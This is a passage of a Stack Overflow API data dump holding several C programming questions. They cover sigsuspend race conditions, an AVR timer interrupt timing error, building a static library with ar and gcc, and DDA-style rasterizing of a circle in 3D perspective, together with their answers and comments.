1282071600, "closed_beta_date": 1281466800, "site_state": "normal", "high_resolution_icon_url": "https://cdn.sstatic.net/Sites/unix/Img/apple-touch-icon@2.png", "favicon_url": "https://cdn.sstatic.net/Sites/unix/Img/favicon.ico", "icon_url": "https://cdn.sstatic.net/Sites/unix/Img/apple-touch-icon.png", "audience": "users of Linux, FreeBSD and other Un*x-like operating systems", "site_url": "https://unix.stackexchange.com", "api_site_parameter": "unix", "logo_url": "https://cdn.sstatic.net/Sites/unix/Img/logo.png", "name": "Unix &amp; Linux", "site_type": "main_site"}, "on_date": 1483004629, "question_id": 333096}, "owner": {"user_type": "does_not_exist", "display_name": "Jay"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 116, "favorite_count": 0, "answer_count": 0, "score": 2, "last_activity_date": 1483004629, "creation_date": 1482868659, "question_id": 41377023, "link": "https://stackoverflow.com/questions/41377023/why-there-is-still-a-race-condition-even-though-i-call-sigsuspend", "title": "Why there is still a race condition even though I call sigsuspend()?", "body": "<p>This is the coursework of my class. I'm not sure whether my answer is correct or not. Can someone give me any instruction. In the first question, I can't figure out why there is a race condition, is my explanation wrong?</p>\n\n<pre><code>#include &lt;signal.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/wait.h&gt;\n\nvoid sigHandler(int signo) {\n    /* Line C */\n}\n\nint main() {\n    pid_t pid;\n    sigset_t newmask, waitmask, oldmask;\n\n    if ((pid = fork()) == 0) {      // Child\n        struct sigaction action;\n\n        sigemptyset(&amp;newmask);\n        sigemptyset(&amp;waitmask);\n        sigaddset(&amp;newmask, SIGUSR1);\n        sigaddset(&amp;waitmask, SIGUSR2);\n        sigprocmask(SIG_BLOCK, &amp;newmask, &amp;oldmask);\n\n        action.sa_flags = 0;\n        sigemptyset(&amp;action.sa_mask);\n        action.sa_handler = sigHandler;\n        sigaction(SIGUSR2, &amp;action, NULL);\n        sigaction(SIGINT, &amp;action, NULL);\n        sigaddset(&amp;action.sa_mask, SIGINT);\n        sigaction(SIGUSR1, &amp;action, NULL);\n\n        /* Line A: critical section */\n        sigsuspend(&amp;waitmask);  /* Line B */\n\n    } else {        // Parent\n        int stat;\n        kill(pid, SIGUSR1);\n        kill(pid, SIGUSR2);\n        kill(pid, SIGINT);\n        pid = wait(&amp;stat);\n    }\n    return 0;\n}\n</code></pre>\n\n<ol>\n<li>Although <code>sigsuspend()</code> is used here, there is still a race condition. Why?</li>\n</ol>\n\n<p>Since we don't know when the parent process executes first or the child process. If the parent executes first, the parent sends <code>SIGUSR1</code>, <code>SIGUSR2</code> and <code>SIGINT</code> to the child, since <code>SIGUSR1</code> is now blocked, the <code>SIGUSR2</code> and <code>SIGINT</code> will be correctly catched, but we then <code>sigaddset(&amp;action.sa_mask, SIGINT)</code>, which means the following line <code>sigaction(SIGUSR1, &amp;action, NULL)</code> will blocked both <code>SIGUSR1</code> and <code>SIGINT</code>. Finally, the Line B calls <code>sigsuspend(&amp;waitmask)</code>, which will wait signals excepts <code>SIGUSR2</code>. But here is my question: since <code>sigsuspend(&amp;waitmask)</code> didn't block <code>SIGUSR1</code>, why there is still a race condition? Were the <code>SIGUSR2</code> and <code>SIGINT</code> catched already?</p>\n\n<ol start=\"2\">\n<li>Suppose the child process receives (a)<code>SIGUSR2</code> at line A, (b)<code>SIGINT</code> when blocked at line B, and (c)<code>SIGUSR1</code> when <code>SIGINT</code> is caught at line C, how the child process' signal mask changes? Explane your answer.</li>\n</ol>\n\n<p>(a) The mask contains <code>SIGUSR1</code> (by <code>sigprocmask()</code>) and <code>SIGINT</code>(by <code>sigaddset()</code>).</p>\n\n<p>(b) The mask contains only <code>SIGUSR2</code> (by <code>sigsuspend()</code>).\nAfter <code>sigsuspend()</code>, the mask restore to <code>SIGUSR1</code> and <code>SIGINT</code>.</p>\n\n<p>(c) The mask contains <code>SIGINT</code> and <code>SIGUSR1</code>, so it'll block <code>SIGUSR1</code>.</p>\n\n<ol start=\"3\">\n<li>Suppose the child process receives (a)<code>SIGUSR1</code> at line A, (b)<code>SIGUSR2</code> when blocked at line B, and (c)<code>SIGINT</code> when <code>SIGUSR1</code> is caught at line C, how the child process' signal mask changes? Explane your answer.</li>\n</ol>\n\n<p>(a) The mask contains both <code>SIGUSR1</code> (by <code>sigprocmask()</code>) and <code>SIGINT</code> (by <code>sigaddset()</code>) and the <code>SIGUSR1</code> is blocked.</p>\n\n<p>(b) The mask contains only <code>SIGUSR2</code>(by <code>sigsuspend()</code>).\n   After <code>sigsuspend()</code>, the mask restore to <code>SIGUSR1</code> and <code>SIGINT</code>.</p>\n\n<p>(c) The mask contains <code>SIGINT</code> and <code>SIGUSR1</code>, so it'll block <code>SIGINT</code>.</p>\n"}, {"tags": ["c", "timer", "embedded", "avr", "atmel"], "answers": [{"comments": [{"owner": {"reputation": 124, "user_id": 6857617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KRNGF.jpg?s=128&g=1", "display_name": "RisuRyu", "link": "https://stackoverflow.com/users/6857617/risuryu"}, "edited": false, "score": 0, "creation_date": 1482883677, "post_id": 41351837, "comment_id": 69909476, "body": "Thanks, that make sense."}], "tags": [], "owner": {"reputation": 7997, "user_id": 66363, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7dd2a69d2d8c93796e3f4a55d70db00d?s=128&d=identicon&r=PG", "display_name": "uncleO", "link": "https://stackoverflow.com/users/66363/uncleo"}, "is_accepted": true, "score": 1, "last_activity_date": 1482870660, "creation_date": 1482870660, "answer_id": 41351837, "question_id": 41351339, "link": "https://stackoverflow.com/questions/41351339/avr-interrupt-configuration/41351837#41351837", "title": "AVR Interrupt Configuration", "body": "<p>2 seconds is 60500 cycles. But your ISR is incrementing the volatile variable every 1 millisecond. Naturally, it will take 60.5 seconds for the variable to reach 60500.</p>\n\n<p>As a side note, it is better to change the compare value, rather than reset TCNT, to avoid timing drift. That is, let the counter run freely, and use <code>OCR1A += 31;</code> to hit the next interrupt. Resetting TCNT as you do will ignore the time inside the ISR.</p>\n"}], "owner": {"reputation": 124, "user_id": 6857617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KRNGF.jpg?s=128&g=1", "display_name": "RisuRyu", "link": "https://stackoverflow.com/users/6857617/risuryu"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 129, "favorite_count": 0, "accepted_answer_id": 41351837, "answer_count": 1, "score": 0, "last_activity_date": 1570525826, "creation_date": 1482868193, "last_edit_date": 1570525826, "question_id": 41351339, "link": "https://stackoverflow.com/questions/41351339/avr-interrupt-configuration", "title": "AVR Interrupt Configuration", "body": "<p>The problem is that the timing behavior is totally wrong (factor 30).</p>\n\n<p>I have an ATmega 644PA which is running with 8 Mhz (CKDIV8 fuse is not set). <br/>\nI wanted an interrupt every 1 ms. I use Timer1 (16 bit timer) in the compare mode. <br/> \nThe prescaler was choiced by the timing range which i need. <br/> \nHere 1 ms to ~2s. (limited through the 16 bit timer reg.)</p>\n\n<h2>Calculation</h2>\n\n<p>CPU: 8.000.000 Hz <br/>\nPrescaler: 256 <br/> <br/>\n8.000.000 Hz / 256 = 31250 Cycles / s (Hz)<br/></p>\n\n<p>1000 ms = 31250 Cycles <br/>\n1 ms = 30.25 Cycles (31.25 - 1, timer reg. start by 0)<br/></p>\n\n<p>From here i can calculate it up, for example:<br/>\n100 ms = 3025 Cycles <br/>\n2s = 60500 Cycles <br/></p>\n\n<h2>Code</h2>\n\n<p>Timer Init <br/></p>\n\n<pre><code>    cli();                  // disable global interrupts\n    TCCR1A = (1 &lt;&lt; WGM01);  // CTC ON\n    TCCR1B = 0x04;          // Prescaler 256\n    OCR1A  = 30;            // set compare reg.\n    TIMSK1 = (1 &lt;&lt; OCIE1A); // set interrupt mask\n    TCNT1  = 0x00;          // set counter reg. to zero\n    sei();                  // enable global interrupts\n</code></pre>\n\n<p>ISR: <br/></p>\n\n<pre><code>ISR(TIMER1_COMPA_vect)\n{\n  // start own code\n  ...\n  // end own code\n  TCNT1 = 0x00; // reset counter reg. to zero after match (same which should CTC do)\n}\n</code></pre>\n\n<p>Now i have for example a volatile variable which will be incremented in the ISR function. <br/>\nI'm polling the variable and wait so long till it reach 60500, which is equal to 2s. <br/> \nAfter it i just set an led on.<br/></p>\n\n<p>I measured it by phone and it takes 1 minute till the led goes on. <br/>\nIt takes to long with the factor 30 => 60s divided by 2s are 30.  <br/>\nI also tried to use an external program to calculate it, it came to the same results. (0x1E = 30) <br/>\n<a href=\"https://i.stack.imgur.com/tduN8.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/tduN8.png\" alt=\"Screenshot\"></a>\n</p>\n\n<p>Someone an idea where my mistake is ?</p>\n"}, {"tags": ["c", "gcc"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1482865946, "post_id": 41350856, "comment_id": 69903407, "body": "The term you are looking for is <i>static library</i>. Search for how to create one in e.g. Linux and you will get many hits."}], "answers": [{"comments": [{"owner": {"reputation": 537, "user_id": 5451105, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/d770b80f020b374829aafe06bff62e40?s=128&d=identicon&r=PG&f=1", "display_name": "Mano Mini", "link": "https://stackoverflow.com/users/5451105/mano-mini"}, "edited": false, "score": 0, "creation_date": 1482866442, "post_id": 41350923, "comment_id": 69903607, "body": "and how can I include the <code>lib</code> in this static library? using <code>ar crf yourlib.a a.o b.o c.o -llib</code> hasn&#39;t work"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "reply_to_user": {"reputation": 537, "user_id": 5451105, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/d770b80f020b374829aafe06bff62e40?s=128&d=identicon&r=PG&f=1", "display_name": "Mano Mini", "link": "https://stackoverflow.com/users/5451105/mano-mini"}, "edited": false, "score": 0, "creation_date": 1482866900, "post_id": 41350923, "comment_id": 69903786, "body": "@ManoMini Static libraries are only collections (or archives, that&#39;s what the <code>.a</code> suffix stands for) of object files. You can&#39;t <i>link</i> a static library, to create one that contains itself <i>and</i> all its dependencies. That&#39;s not how static libraries work. If your static library depends on another library, the user of your library have to link with your dependencies as well. You simply can&#39;t create a stand-alone static library."}, {"owner": {"reputation": 356, "user_id": 7337790, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/nTugP.jpg?s=128&g=1", "display_name": "zsram", "link": "https://stackoverflow.com/users/7337790/zsram"}, "edited": false, "score": 0, "creation_date": 1482867072, "post_id": 41350923, "comment_id": 69903849, "body": "If what you call &quot;lib&quot; is a static library, then yes, you can extract elements (.o files) from your, say, lib.a this way: ar -x lib.a... then you will have all those .o in your directory. Then you can do the same above, now including the list of .o files extracted from lib.a with ar -x. You can use *.o if they are too many."}, {"owner": {"reputation": 537, "user_id": 5451105, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/d770b80f020b374829aafe06bff62e40?s=128&d=identicon&r=PG&f=1", "display_name": "Mano Mini", "link": "https://stackoverflow.com/users/5451105/mano-mini"}, "edited": false, "score": 0, "creation_date": 1482867272, "post_id": 41350923, "comment_id": 69903935, "body": "@zsram no. it&#39;s like <code>cmath</code> when you have to use <code>-lm</code> in gcc"}, {"owner": {"reputation": 356, "user_id": 7337790, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/nTugP.jpg?s=128&g=1", "display_name": "zsram", "link": "https://stackoverflow.com/users/7337790/zsram"}, "edited": false, "score": 0, "creation_date": 1482867446, "post_id": 41350923, "comment_id": 69904005, "body": "For example in linux, libm exists both in static and dynamic versions: $ find /usr/lib -name libm.*   that command results in libm.a and libm.so in my system. Maybe your library has also a static version."}], "tags": [], "owner": {"reputation": 356, "user_id": 7337790, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/nTugP.jpg?s=128&g=1", "display_name": "zsram", "link": "https://stackoverflow.com/users/7337790/zsram"}, "is_accepted": true, "score": 2, "last_activity_date": 1482866170, "creation_date": 1482866170, "answer_id": 41350923, "question_id": 41350856, "link": "https://stackoverflow.com/questions/41350856/creating-object-file-from-other-dependent-object-files/41350923#41350923", "title": "Creating object file from other dependent object files", "body": "<p>I think you want to create a library out of your .o files. </p>\n\n<p>ar crf yourlib.a a.o b.o c.o</p>\n\n<p>then, other people can compile their programs by doing, for example:</p>\n\n<p>gcc -o main main.c yourlib.a</p>\n"}], "owner": {"reputation": 537, "user_id": 5451105, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/d770b80f020b374829aafe06bff62e40?s=128&d=identicon&r=PG&f=1", "display_name": "Mano Mini", "link": "https://stackoverflow.com/users/5451105/mano-mini"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 359, "favorite_count": 0, "closed_date": 1482867613, "accepted_answer_id": 41350923, "answer_count": 1, "score": 0, "last_activity_date": 1482866170, "creation_date": 1482865873, "question_id": 41350856, "link": "https://stackoverflow.com/questions/41350856/creating-object-file-from-other-dependent-object-files", "closed_reason": "Duplicate", "title": "Creating object file from other dependent object files", "body": "<p>my files dependencies <code>a.c</code>, <code>a.h</code>, <code>b.c</code>, <code>b.h</code>, <code>c.c</code>, <code>c.h</code>,  are like that:</p>\n\n<pre><code>// a.c\n#include \"a.h\"\n#include \"b.h\"\n#include \"c.h\"\n#include &lt;lib&gt;\n\n// b.c\n#include \"b.h\"\n#include &lt;lib&gt;\n\n// c.c\n#include \"c.h\"\n#include &lt;lib&gt;\n</code></pre>\n\n<p>I have no <code>main()</code> function. I need to create <code>out.o</code> and someone else will use this with main in his program (he'll have to write <code>#include \"a.h\"</code> to use the functions I wrote there).</p>\n\n<p>so I wrote</p>\n\n<p><code>gcc -std=c99 -c c.c -o c.o -llib</code></p>\n\n<p><code>gcc -std=c99 -c b.c -o b.o -llib</code></p>\n\n<p><code>gcc -std=c99 -c a.c -o a.o -llib</code></p>\n\n<p>but when I try to combine them using</p>\n\n<p><code>gcc -o out.o a.o b.o c.o -llib</code></p>\n\n<p>I get many errors like <code>relocation 18 has invalid symbol index 13</code> and in the end <code>undefined reference to 'main'</code>.</p>\n\n<p>How can I create what I need?\n`</p>\n"}, {"tags": ["c", "unix", "signals", "race-condition"], "owner": {"reputation": 181, "user_id": 7095660, "user_type": "registered", "accept_rate": 44, "profile_image": "https://i.stack.imgur.com/zCLNZ.png?s=128&g=1", "display_name": "walkcc", "link": "https://stackoverflow.com/users/7095660/walkcc"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 323, "favorite_count": 0, "answer_count": 0, "score": 3, "last_activity_date": 1482871114, "creation_date": 1482864941, "last_edit_date": 1482871114, "question_id": 41350656, "link": "https://stackoverflow.com/questions/41350656/about-unix-signals-sigsuspend-and-race-condition", "title": "About unix signals: sigsuspend() and race condition", "body": "<p>This is the coursework of my class. I'm not sure whether my answer is correct or not. Can someone give me any instruction. In the first question, I can't figure out why there is a race condition, is my explanation wrong?</p>\n\n<pre><code>#include &lt;signal.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/wait.h&gt;\n\nvoid sigHandler(int signo) {\n    /* Line C */\n}\n\nint main() {\n    pid_t pid;\n    sigset_t newmask, waitmask, oldmask;\n\n    if ((pid = fork()) == 0) {      // Child\n        struct sigaction action;\n\n        sigemptyset(&amp;newmask);\n        sigemptyset(&amp;waitmask);\n        sigaddset(&amp;newmask, SIGUSR1);\n        sigaddset(&amp;waitmask, SIGUSR2);\n        sigprocmask(SIG_BLOCK, &amp;newmask, &amp;oldmask);\n\n        action.sa_flags = 0;\n        sigemptyset(&amp;action.sa_mask);\n        action.sa_handler = sigHandler;\n        sigaction(SIGUSR2, &amp;action, NULL);\n        sigaction(SIGINT, &amp;action, NULL);\n        sigaddset(&amp;action.sa_mask, SIGINT);\n        sigaction(SIGUSR1, &amp;action, NULL);\n\n        /* Line A: critical section */\n        sigsuspend(&amp;waitmask);  /* Line B */\n\n    } else {        // Parent\n        int stat;\n        kill(pid, SIGUSR1);\n        kill(pid, SIGUSR2);\n        kill(pid, SIGINT);\n        pid = wait(&amp;stat);\n    }\n    return 0;\n}\n</code></pre>\n\n<ol>\n<li>Although <code>sigsuspend()</code> is used here, there is still a race condition. Why?</li>\n</ol>\n\n<p>Since we don't know when the parent process executes first or the child process. If the parent executes first, the parent sends <code>SIGUSR1</code>, <code>SIGUSR2</code> and <code>SIGINT</code> to the child, since <code>SIGUSR1</code> is now blocked, the <code>SIGUSR2</code> and <code>SIGINT</code> will be correctly catched, but we then <code>sigaddset(&amp;action.sa_mask, SIGINT)</code>, which means the following line <code>sigaction(SIGUSR1, &amp;action, NULL)</code> will blocked both <code>SIGUSR1</code> and <code>SIGINT</code>. Finally, the Line B calls <code>sigsuspend(&amp;waitmask)</code>, which will wait signals excepts <code>SIGUSR2</code>. But here is my question: since <code>sigsuspend(&amp;waitmask)</code> didn't block <code>SIGUSR1</code>, why there is still a race condition? Were the <code>SIGUSR2</code> and <code>SIGINT</code> catched already?</p>\n\n<ol start=\"2\">\n<li>Suppose the child process receives (a)<code>SIGUSR2</code> at line A, (b)<code>SIGINT</code> when blocked at line B, and (c)<code>SIGUSR1</code> when <code>SIGINT</code> is caught at line C, how the child process' signal mask changes? Explain your answer.</li>\n</ol>\n\n<p>(a) The mask contains <code>SIGUSR1</code> (by <code>sigprocmask()</code>) and <code>SIGINT</code>(by <code>sigaddset()</code>).</p>\n\n<p>(b) The mask contains only <code>SIGUSR2</code> (by <code>sigsuspend()</code>).\nAfter <code>sigsuspend()</code>, the mask restore to <code>SIGUSR1</code> and <code>SIGINT</code>.</p>\n\n<p>(c) The mask contains <code>SIGINT</code> and <code>SIGUSR1</code>, so it'll block <code>SIGUSR1</code>.</p>\n\n<ol start=\"3\">\n<li>Suppose the child process receives (a)<code>SIGUSR1</code> at line A, (b)<code>SIGUSR2</code> when blocked at line B, and (c)<code>SIGINT</code> when <code>SIGUSR1</code> is caught at line C, how the child process' signal mask changes? Explain your answer.</li>\n</ol>\n\n<p>(a) The mask contains both <code>SIGUSR1</code> (by <code>sigprocmask()</code>) and <code>SIGINT</code> (by <code>sigaddset()</code>) and the <code>SIGUSR1</code> is blocked.</p>\n\n<p>(b) The mask contains only <code>SIGUSR2</code>(by <code>sigsuspend()</code>).\n   After <code>sigsuspend()</code>, the mask restore to <code>SIGUSR1</code> and <code>SIGINT</code>.</p>\n\n<p>(c) The mask contains <code>SIGINT</code> and <code>SIGUSR1</code>, so it'll block <code>SIGINT</code>.</p>\n"}, {"tags": ["c", "algorithm", "graphics", "3d", "bresenham"], "comments": [{"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1482864481, "post_id": 41350383, "comment_id": 69902796, "body": "Too broad. But why do you think float is slower than integers on modern CPUs or GPUs? After all, you can replace a division by a multiplication (this works for integers, too with a trick). Do some research."}, {"owner": {"reputation": 15461, "user_id": 9642, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/5c5f08d92e1ce6b99fc90e365c9b0261?s=128&d=identicon&r=PG", "display_name": "Neil C. Obremski", "link": "https://stackoverflow.com/users/9642/neil-c-obremski"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1482864762, "post_id": 41350383, "comment_id": 69902926, "body": "You&#39;re right about floats on modern processors but my question is related to Bresenham-style algorithms which are DDA (integer) based."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 1, "creation_date": 1482864834, "post_id": 41350383, "comment_id": 69902954, "body": "There is an ellipse version of integer Bresenham. Perhaps there is angled ellipse too!"}, {"owner": {"reputation": 15461, "user_id": 9642, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/5c5f08d92e1ce6b99fc90e365c9b0261?s=128&d=identicon&r=PG", "display_name": "Neil C. Obremski", "link": "https://stackoverflow.com/users/9642/neil-c-obremski"}, "edited": false, "score": 0, "creation_date": 1482865134, "post_id": 41350383, "comment_id": 69903069, "body": "Thanks Weather Vane! It would be wonderful if it could be tweaked to simulate 3D plane projection. I might try that and if I figure it out, I&#39;ll post it here"}, {"owner": {"reputation": 36328, "user_id": 5483526, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ec50563f80bacd2a7fed69bd31d0c810?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Timmermans", "link": "https://stackoverflow.com/users/5483526/matt-timmermans"}, "edited": false, "score": 0, "creation_date": 1482897770, "post_id": 41350383, "comment_id": 69912105, "body": "The perspective projection of a circle or ellipse is just an ellipse, so once you find the projected ellipse you can use a 2D ellipse DDA to draw it."}], "owner": {"reputation": 15461, "user_id": 9642, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/5c5f08d92e1ce6b99fc90e365c9b0261?s=128&d=identicon&r=PG", "display_name": "Neil C. Obremski", "link": "https://stackoverflow.com/users/9642/neil-c-obremski"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 243, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1482865290, "creation_date": 1482863562, "last_edit_date": 1482865290, "question_id": 41350383, "link": "https://stackoverflow.com/questions/41350383/is-there-a-dda-style-algorithm-for-rasterizing-a-2d-circle-on-3d-plane", "title": "Is there a DDA-style algorithm for rasterizing a 2D circle on 3D plane?", "body": "<p>I'm basically curious about a corollary of Bresenham's circle drawing but in 3D perspective where the end result is a flat circle on the <code>Y</code> (vertical) plane. Is there a magic DDA-type algorithm out there for this sort of thing?</p>\n\n<p>NOTE that by <strong>DDA</strong> I mean using mostly integers and avoiding as many multiplications and divides as possible since the main bottleneck is the perspective <code>Z</code> divide.</p>\n\n<p>What I've come up with so far is to loop through 360 degrees by some increment and draw a line between the projected coordinate and the next one based on the increment. The image below is a test using a 23 degree increment (I'd use 22.5 but this works from an integer lookup with only whole degree accuracy):</p>\n\n<p><a href=\"https://i.stack.imgur.com/ZdH9V.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/ZdH9V.png\" alt=\"circle drawn using lines with a 23 degree increment\"></a></p>\n\n<p>Pseudo code for this would be something like:</p>\n\n<pre><code>for (degree = 0; degree &lt; 360; degree += degree_inc) {\n    z1 = z + radius * cos(degree)\n    x1 = x + radius * sin(degree)\n    y1 = y\n\n    next_degree = degree + degree_inc\n    if (next_degree &gt;= 360) {\n        next_degree = 0;\n    }\n    z2 = z + radius * cos(next_degree)\n    x2 = x + radius * sin(next_degree)\n    y2 = y\n\n    line(project_x(x1,z1), project_y(y1,z1),\n         project_x(x2,z2), project_y(y2,z2))\n}\n</code></pre>\n\n<p>Obviously there are a lot of little optimizations to the real code (lookup tables and pre-calculated amounts) but this is the essence of it.</p>\n\n<p>Cheers!</p>\n"}]